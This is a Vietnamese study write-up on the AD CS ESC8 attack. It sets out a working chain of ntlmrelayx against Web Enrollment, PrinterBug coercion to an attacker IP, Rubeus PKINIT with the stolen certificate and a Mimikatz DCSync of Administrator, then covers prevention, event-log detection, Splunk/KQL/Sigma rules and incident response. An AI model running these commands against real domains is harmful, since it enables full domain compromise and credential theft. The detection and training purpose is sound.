---
layout: post
title: "PKI - ESC8"
date: 2026-07-14 00:24:23 +0700
categories: ["Windows Attacks & Defense"]
tags: [active-directory, windows-attacks-defense, adcs, pki, esc8, ntlm-relay, ntlmrelayx, printerbug, web-enrollment, pkinit, rubeus, dcsync, event-4624, event-4768, event-4886, event-4887, splunk, elk, sigma, threat-hunting, incident-response, cdsa]
description: "Tóm tắt PKI ESC8: relay NTLM tới AD CS Web Enrollment để lấy certificate của Domain Controller, dùng PKINIT lấy TGT, thực hiện DCSync và phát hiện bằng Event ID 4886, 4887, 4768 và 4624."
toc: true
---

# PKI - ESC8

Bài này thuộc module **Windows Attacks & Defense**, tập trung vào kỹ thuật **ESC8**: relay NTLM authentication tới Active Directory Certificate Services Web Enrollment để xin certificate thay mặt computer account hoặc Domain Controller.

```text
Mục tiêu: hiểu attack chain PrinterBug/Coercer → NTLMRelayx → AD CS Web Enrollment
→ certificate → PKINIT → TGT → DCSync, đồng thời xây detection theo góc nhìn SOC/CDSA.
```

> Chỉ thực hành trong HTB, lab hoặc hệ thống có ủy quyền rõ ràng. Không ép xác thực, relay NTLM hoặc xin certificate ngoài phạm vi được phép.

---

## Timeline cập nhật

```text
Created at: 2026-07-14 00:24:23 +0700
Timezone: Asia/Ho_Chi_Minh
Module: Windows Attacks & Defense
Section: PKI - ESC8
Focus: NTLM relay to AD CS, Web Enrollment, PKINIT, DCSync, 4886/4887/4768/4624
```

---

# 1. ESC8 là gì?

**ESC8** là kỹ thuật relay NTLM authentication tới HTTP endpoint của AD CS Web Enrollment.

Ví dụ endpoint:

```text
http://<CA-SERVER>/certsrv/
```

Nếu Web Enrollment chấp nhận NTLM qua HTTP và không có cơ chế bảo vệ phù hợp, attacker có thể relay authentication của user/computer account để xin certificate thay mặt account đó.

---

# 2. Attack Chain tổng quát

```text
1. Attacker chạy NTLMRelayx nhắm vào AD CS Web Enrollment.
2. Attacker ép Domain Controller xác thực về relay host.
3. NTLMRelayx relay authentication của DC$ tới CA.
4. CA cấp certificate theo DomainController template.
5. Attacker dùng certificate request TGT qua PKINIT.
6. Attacker trở thành DC account.
7. Attacker thực hiện DCSync.
```

---

# 3. Điều kiện để ESC8 thành công

Các điều kiện thường gặp:

- AD CS Web Enrollment được cài đặt.
- Web Enrollment dùng HTTP hoặc không enforce HTTPS đúng cách.
- NTLM authentication được chấp nhận.
- Attacker có thể coercion target bằng PrinterBug/Coercer.
- Template phù hợp có thể enroll cho account bị relay.
- Network path giữa relay host và CA hoạt động.

---

# 4. Cấu hình NTLMRelayx trong lab

Ví dụ:

```bash
impacket-ntlmrelayx   -t http://<CA_IP>/certsrv/default.asp   --template DomainController   -smb2support   --adcs
```

Ý nghĩa:

| Option | Mục đích |
|---|---|
| `-t` | AD CS Web Enrollment endpoint |
| `--template` | Certificate template cần request |
| `-smb2support` | Hỗ trợ SMB2 |
| `--adcs` | Bật AD CS relay logic |

NTLMRelayx sẽ chờ incoming NTLM authentication rồi relay sang CA.

---

# 5. Trigger coerced authentication

Trong HTB lab, có thể dùng Dementor/PrinterBug:

```bash
python3 dementor.py   <ATTACKER_IP>   <TARGET_DC_IP>   -u <DOMAIN_USER>   -d <DOMAIN>   -p '<PASSWORD>'
```

Ngay cả khi tool báo:

```text
RPC_S_INVALID_NET_ADDR
```

coerced authentication vẫn có thể đã được trigger; cần kiểm tra NTLMRelayx output.

---

# 6. Certificate được cấp cho Domain Controller

Khi relay thành công, output có thể cho thấy:

```text
Authenticating as EAGLE/DC2$ SUCCEED
Generating CSR
GOT CERTIFICATE
Certificate ID: 48
```

Certificate thường được trả ở dạng Base64 PKCS#12 và có thể dùng trực tiếp với Rubeus.

---

# 7. Dùng certificate request TGT

Ví dụ lab:

```powershell
.\Rubeus.exe asktgt `
  /user:DC2$ `
  /ptt `
  /certificate:<BASE64_CERTIFICATE>
```

Nếu thành công:

```text
TGT request successful
Ticket successfully imported
```

![Rubeus DC2 TGT using certificate](/assets/img/windows-attacks-defense/pki-esc8/rubeus-dc2-tgt-certificate.png)

---

# 8. Tại sao TGT của DC nguy hiểm?

Sau khi có TGT của `DC2$`, attacker có thể authenticate như Domain Controller.

Điều này mở ra:

- DCSync.
- LDAP/RPC access với machine identity Tier-0.
- Kerberos service-ticket requests.
- Domain-wide credential compromise.

---

# 9. DCSync follow-up

Sau khi ticket được inject, attacker có thể chạy Mimikatz trong lab:

```text
lsadump::dcsync /user:Administrator
```

Output có thể trả:

- NTLM hash.
- AES keys.
- Password metadata.
- Supplemental credentials.

![Mimikatz DCSync Administrator](/assets/img/windows-attacks-defense/pki-esc8/mimikatz-dcsync-administrator.png)

---

# 10. Vì sao prevention quan trọng?

Attack này thành công vì:

```text
Coercion thành công
AD CS Web Enrollment chấp nhận NTLM qua HTTP
Template DomainController được request thành công
Certificate dùng được cho PKINIT
```

Một misconfiguration ở Web Enrollment có thể dẫn tới full domain compromise.

---

# 11. Prevention

Biện pháp quan trọng:

- Enforce HTTPS trên AD CS Web Enrollment.
- Disable HTTP.
- Disable NTLM nếu có thể.
- Bật Extended Protection for Authentication.
- Bật Channel Binding.
- Remove Web Enrollment nếu không cần.
- Disable Print Spooler trên Domain Controllers.
- Block outbound SMB từ Tier-0 servers.
- Enforce SMB signing.
- Review certificate templates.
- Scan AD CS định kỳ bằng Certify/Certipy.
- Segment CA khỏi user networks.
- Monitor certificate enrollment.

---

# 12. Event ID 4886

CA ghi:

```text
Event ID 4886 - Certificate Services received a certificate request
```

Field cần xem:

- Request ID.
- Requester.
- Certificate Template.
- Attributes.
- CA hostname.

Trong ESC8, requester có thể là machine account như:

```text
EAGLE\DC2$
```

---

# 13. Event ID 4887

CA ghi:

```text
Event ID 4887 - Certificate Services approved a certificate request and issued a certificate
```

Điểm đáng chú ý:

- Template `DomainController`.
- Requester là machine account.
- Request ID khớp 4886.
- Subject là DC FQDN.
- Request xảy ra từ flow không bình thường.

![Events 4886 and 4887](/assets/img/windows-attacks-defense/pki-esc8/events-4886-4887-domaincontroller-template.png)

---

# 14. Event ID 4768 với certificate authentication

Khi certificate được dùng để request TGT:

```text
Event ID 4768 - A Kerberos authentication ticket (TGT) was requested
```

Field cần xem:

- Account Name.
- Client Address.
- Pre-Authentication Type.
- Certificate Issuer.
- Serial Number.
- Thumbprint.

Trong ESC8, điểm rất đáng ngờ là:

```text
DC2$ request TGT bằng certificate
nhưng Client Address không phải IP của DC2
```

![Event 4768 certificate authentication](/assets/img/windows-attacks-defense/pki-esc8/event-4768-certificate-authentication.png)

---

# 15. Event ID 4624

Khi TGT/certificate được dùng tiếp:

```text
Event ID 4624 - An account was successfully logged on
```

High-confidence condition:

```text
Machine account DC2$ logon từ source IP không phải IP của DC2.
```

![Event 4624 machine account logon](/assets/img/windows-attacks-defense/pki-esc8/event-4624-machine-account-logon.png)

---

# 16. Correlation Logic

Chuỗi detection tốt:

```text
4886: CA nhận request bằng DomainController template
        ↓
4887: CA cấp certificate
        ↓
4768: DC2$ request TGT bằng certificate từ IP lạ
        ↓
4624: DC2$ logon từ IP lạ
        ↓
DCSync/credential access
```

Đây là correlation có độ tin cậy cao.

---

# 17. Splunk Detection

## CA request/issuance

```spl
index=wineventlog sourcetype=WinEventLog:Security
EventCode IN (4886,4887)
Certificate_Template="DomainController"
| table _time, host, EventCode, Requester, Request_ID, Subject, Serial_Number
```

## Certificate-based TGT from unexpected IP

```spl
index=wineventlog sourcetype=WinEventLog:Security EventCode=4768
Cert_Issuer_Name=*
| eval src=coalesce(Client_Address,IpAddress)
| lookup dc_account_ip_map account as Account_Name OUTPUT expected_ip
| where like(Account_Name,"%$") AND isnotnull(expected_ip) AND src!=expected_ip
| table _time, Account_Name, src, expected_ip, Cert_Issuer_Name, Cert_Serial_Number
```

## Machine account successful logon from unexpected source

```spl
index=wineventlog sourcetype=WinEventLog:Security EventCode=4624 Logon_Type=3
| eval src=coalesce(Source_Network_Address,IpAddress)
| lookup dc_account_ip_map account as Account_Name OUTPUT expected_ip
| where like(Account_Name,"%$") AND isnotnull(expected_ip) AND src!=expected_ip
| table _time, host, Account_Name, src, expected_ip
```

---

# 18. ELK/KQL

CA events:

```kql
event.code: ("4886" or "4887")
and winlog.event_data.CertificateTemplate: "DomainController"
```

Certificate TGT:

```kql
event.code: "4768"
and winlog.event_data.CertIssuerName: *
and user.name: *$
```

Machine account logon:

```kql
event.code: "4624"
and winlog.event_data.LogonType: "3"
and user.name: *$
```

Sau đó enrich bằng CMDB để so sánh source IP.

---

# 19. Sigma Rule

```yaml
title: Domain Controller Certificate Issued Through AD CS
status: experimental
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID: 4887
    CertificateTemplate: 'DomainController'
  condition: selection
falsepositives:
  - Legitimate certificate auto-enrollment by Domain Controllers
level: medium
```

Rule cần thêm context:

- Requester là DC account.
- Request source không phải DC.
- Certificate issuance ngoài baseline.

---

# 20. Threat Hunting

Hunt theo:

- DomainController template request bất thường.
- 4886/4887 từ machine account ngoài lịch auto-enrollment.
- 4768 có certificate information từ non-DC IP.
- DC machine account logon từ user subnet.
- AD CS HTTP access từ relay host.
- NTLMRelayx/PrinterBug/Coercer artifacts.
- DCSync sau certificate issuance.

---

# 21. Incident Response Checklist

```text
[ ] Xác định Request ID trên CA.
[ ] Xác định requester machine account.
[ ] Trích certificate serial/thumbprint.
[ ] Revoke certificate.
[ ] Update/publish CRL.
[ ] Review 4886/4887 trên CA.
[ ] Review 4768 và 4624 trên DC.
[ ] Xác định relay/coercion source IP.
[ ] Isolate source host.
[ ] Disable Web Enrollment HTTP.
[ ] Enforce HTTPS/EPA.
[ ] Hunt DCSync và lateral movement.
[ ] Rotate affected machine credentials nếu cần.
```

---

# 22. Mapping với CDSA

## Security Operations & Monitoring

- Thu 4886/4887 từ CA.
- Thu 4768/4624 từ DC.
- Correlate Request ID, certificate serial và source IP.
- Enrich machine account với CMDB.

## Incident Response & Forensics

- Thu certificate artifact.
- Triage relay host.
- Xác định PKINIT usage.
- Revoke certificate và hunt persistence.
- Đánh giá DCSync impact.

## Threat Hunting

- Hunt certificate issuance cho DC.
- Hunt machine account auth từ IP lạ.
- Hunt HTTP access tới `/certsrv/`.
- Hunt DCSync follow-up.

## Detection Engineering

- Sigma cho 4887.
- Splunk/Elastic correlation `4886 → 4887 → 4768 → 4624`.
- CA baseline.
- CMDB enrichment cho machine-account source IP.

---

# 23. Lab Setup

```text
1 Domain Controller
1 AD CS server có Web Enrollment
1 Windows workstation
1 Linux attack host
1 Splunk/ELK/Wazuh server
Windows Event Forwarding hoặc agent
```

Log cần thu:

```text
CA Security: 4886, 4887
DC Security: 4624, 4768
Sysmon: 1, 3, 11
Web/IIS logs của /certsrv/
Windows Firewall logs
```

---

# Key Takeaway

```text
ESC8 relay NTLM authentication tới AD CS Web Enrollment.
Certificate của Domain Controller có thể dùng để request TGT qua PKINIT.
Machine account auth từ IP không đúng là high-confidence signal.
Detection tốt nhất là correlate 4886, 4887, 4768 và 4624.
Prevention trọng tâm là HTTPS, Extended Protection, hạn chế NTLM và loại bỏ Web Enrollment không cần thiết.
```

PKI ESC8 là một attack chain điển hình trong CDSA vì cần kết hợp identity, certificate services, Kerberos, network relay và SIEM correlation để phát hiện chính xác.
